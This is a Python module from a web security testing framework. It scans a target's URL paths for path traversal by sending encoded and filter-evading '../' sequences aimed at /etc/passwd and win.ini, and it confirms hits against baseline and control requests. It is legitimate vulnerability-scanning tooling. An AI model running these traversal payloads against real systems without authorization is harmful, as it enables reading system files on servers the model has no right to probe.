#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Built-in path traversal scanner (traversal in the URL path)."""

from __future__ import annotations

from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urljoin, urlsplit, urlunsplit

import core.variables as variables
from core.methods import fileinj
from core.methods import modkit as kit
from core.methods.print import pvln

info = ("Built-in path traversal scanner for the URL path (no external tools). Traversal sequences "
        "and their encoded / filter-evasion variants (../, ..%2f, %2e%2e/, double encoding, ....//, "
        "..;/, ..%5c, overlong UTF-8) are appended to directories of the target -- DIRECTORY, or the "
        "target URL plus directories found by crawling -- and sent unnormalised. A read is confirmed "
        "only when the /etc/passwd or win.ini content signature is in the response, not in the "
        "directory's baseline, and not in a control request for a missing file. Use the lfi module "
        "for traversal through query/form parameters, and pathtrav for the Vailyn-based scanner.")
searchinfo = "Path Traversal Finder (built-in)"
properties = {
    "DIRECTORY": ["Directory to attack, e.g. /static/ or a full URL (empty: target + crawled directories)", ""],
    "DEPTH": ["Crawl depth used to find directories when DIRECTORY is empty (default 1)", ""],
    "MAXDIRS": ["Maximum directories tested (default 15)", ""],
    **kit.AUTH_OPTIONS,
}

LEVELS = 10
# (segment, separator for the file path, files) -- the segment is repeated LEVELS times
VARIANTS = (
    ("../", "/", ("passwd", "win.ini")),
    ("..%2f", "%2f", ("passwd", "win.ini")),
    ("%2e%2e/", "/", ("passwd",)),
    ("%2e%2e%2f", "%2f", ("passwd",)),
    ("..%252f", "%252f", ("passwd",)),
    ("%252e%252e%252f", "%252f", ("passwd",)),
    ("....//", "/", ("passwd",)),
    ("..;/", "/", ("passwd",)),
    ("%c0%ae%c0%ae/", "/", ("passwd",)),
    ("..%c0%af", "%c0%af", ("passwd",)),
    ("..\\", "\\", ("win.ini",)),
    ("..%5c", "%5c", ("win.ini", "passwd")),
)
FILES = {"passwd": ("etc", "passwd"), "win.ini": ("windows", "win.ini")}


def payloads() -> list[tuple[str, str]]:
    out = []
    for seg, sep, files in VARIANTS:
        for key in files:
            out.append((seg * LEVELS + sep.join(FILES[key]), key))
    return out


def directory(url: str) -> str:
    parts = urlsplit(url)
    path = parts.path or "/"
    path = path if path.endswith("/") else path.rsplit("/", 1)[0] + "/"
    return urlunsplit((parts.scheme, parts.netloc, path, "", ""))


def directories(web) -> list[str]:
    base = kit.url(web) + "/"
    raw = kit.option(properties, "DIRECTORY", "Directory to attack, e.g. /static/ (enter to crawl)", "")
    limit = max(1, kit.integer(properties, "MAXDIRS", "Maximum directories tested", 15))
    if raw:
        url = raw if "://" in raw else urljoin(base, raw)
        return [url if url.endswith("/") else url + "/"]
    dirs = [directory(kit.url(web) + ("/" if urlsplit(kit.url(web)).path in ("", "/") else ""))]
    depth = max(0, kit.integer(properties, "DEPTH", "Crawl depth", 1))
    if depth:
        from core.methods import crawler  # late import: crawler pulls in bs4/lxml
        res = crawler.crawl(web, depth, max_pages=60, headers=kit.request_headers(properties))
        if res.error:
            kit.warn(f"{res.error} Testing the target directory only (or set DIRECTORY).")
        dirs += [directory(u) for u in sorted(res.internal | set(res.pages) | res.assets)]
    dirs = list(dict.fromkeys(dirs))
    if len(dirs) > limit:
        kit.warn(f"{len(dirs)} directories found; testing the first {limit} (raise MAXDIRS).")
    return dirs[:limit]


def check(s, base: str, items: list[tuple[str, str]]) -> tuple[str, str, str] | None:
    baseline = fileinj.body(fileinj.raw_get(s, base)) + fileinj.body(fileinj.raw_get(s, base + "tid404.txt"))
    for payload, key in items:
        url = base + payload
        ev = fileinj.file_evidence(fileinj.body(fileinj.raw_get(s, url)), baseline, key)
        if not ev:
            continue
        ctl = fileinj.control_payload(payload, key)
        if ctl and fileinj.file_evidence(fileinj.body(fileinj.raw_get(s, base + ctl)), baseline, key):
            continue
        return url, key, ev
    return None


def pathtrav(web):
    pvln("path traversal")
    rec = kit.Recorder(web, kit.CRITICAL, "pathtrav_legacy")
    s = kit.http(timeout=10, headers=kit.request_headers(properties))
    dirs = directories(web)
    items = payloads()
    kit.info(f"Testing {len(dirs)} director{'y' if len(dirs) == 1 else 'ies'} with {len(items)} payloads...")
    with ThreadPoolExecutor(max_workers=max(1, min(variables.processes, len(dirs), 16))) as pool:
        results = [r for r in pool.map(lambda d: check(s, d, items), dirs) if r]
    if not results:
        kit.bad("No path traversal found.")
        rec("No path traversal found.")
        return []
    lines = []
    for url, key, ev in results:
        kit.found("Path traversal (confirmed)", url)
        kit.bullet(f"{fileinj.file_label(key)} content: {ev}")
        lines.append(f"Path traversal (confirmed): {url} -- {fileinj.file_label(key)} content: {ev}")
    rec(lines)
    return results


def attack(web):
    pathtrav(web)
